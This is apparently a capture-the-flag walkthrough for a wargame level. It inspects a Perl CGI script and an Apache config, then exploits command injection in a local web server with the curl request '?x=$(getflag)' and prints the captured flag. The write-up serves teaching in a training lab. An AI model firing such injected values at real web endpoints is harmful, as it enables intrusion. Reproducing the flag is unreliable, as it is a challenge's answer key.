# level04

We got some intel from level00:

```shell
dr-xr-x---  2 flag04 level04  33 Mar 12  2016 level04

/var/www/level04

/rofs/var/www/level04
```

1. examinate the perl file

```shell
cat level04.pl
```

seems to indicate that a server is running on localhost:4747

2. search for an apache webserver

```shell
service apache2 status
```

tells us that a webserver is probably running too

3. examinate the files located in /var/www/level04

```shell
cat /var/www/level04/level04.pl
```

shows the same level04.pl script as ~/level04.pl

4. examinate apache's config in /etc/apache2/sites-enabled/

```shell
cat /etc/apache2/sites-enabled/level05.conf
```

shows that the root of the webserv is containing level04.pl and that the process is running as flag04

5. test the webserver for command injection

```shell
curl localhost:4747?x=exploit
```

prints `exploit` in terminal meaning that we might inject some code

6. inject some code to pwn the flag

```shell
curl localhost:4747?x='$(getflag)'
```

gives flag: `ne2searoevaevoem4ov4ar8ap`
